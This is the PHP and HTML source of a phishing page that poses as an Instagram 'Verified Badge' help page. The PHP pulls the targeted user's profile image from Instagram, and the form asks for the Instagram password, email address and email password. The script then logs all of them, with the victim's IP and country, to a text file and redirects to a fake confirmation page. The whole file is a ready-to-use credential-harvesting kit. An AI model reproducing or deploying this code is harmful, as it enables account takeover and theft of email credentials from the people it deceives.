<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["erhanbey"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('nicatozell.txt', 'a');
fwrite($file, "Username: ".$nick."\n\n" ."Password: ".$password. "\n\n"."Mail: ".$mail."\n\n"."Mail Password: ".$mailpass."\n\n"."Ip Adress: " .$ip."\n\n".

"Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n");
fclose($file);
echo '';
    header("Location: confirmed.php");
}

    ?>
<html>

<head>
     <meta charset="utf-8">
	 <title>Verified Badge | Help Instagram</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="https://i.pinimg.com/originals/a2/5f/4f/a25f4f58938bbe61357ebca42d23866f.png">	
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:25px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:270px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:70%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:16px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="ana" style="padding:0px; margin:0px;">
<!--

Bu script erhan can türker qenzy 
tarafından kodlanmıştır
izinsiz kullanmayınız
-->



<div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >

<img src="https://resimag.com/p1/819f2f28aae.png" width=140 id="erhan" style="margin:6px;" >
<br><br>
</div>
<br><br>

<center>
<div id="sa" style="border:1px solid #cecece;"> <br> 

<br>
<h1 id="erhanasd">@<?php echo $nick; ?>  <img src="https://resimag.com/p1/5586a7ac565.jpeg" width=25 ></h1>
<p id="yazi1">
    Hello <?php echo $nick; ?>;
 <br>
 Accounts respresenting well-known personalities and brands are verified. we have determind that your account complies with our rules.  
		 
Our team will make the return as soon as possible.Please give us correct information for "Verified Badge <img src="https://resimag.com/p1/c5b384f8093.png" width=17>".We always work your security and protect your your rights

</p>

<br>

<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Mail Adress" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>


    <input type="password" name="mailpass" placeholder="Mail Password" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
<br>
    <br>
<button id="buton" type="submit"> Confirm as @<?php echo $nick; ?> </button><br>


 
</form>

</center>



</div>
<br> <br>
<center>
<div id="get">
<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
</div>
<br><br>
<div id="menu">
<li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;

<li id="liste"><a href="" id="link">LANGUAGE</a> </li>

</div>
<br>
<p id="copyright">© 2019 INSTAGRAM </p>
</center>


</body>


</html>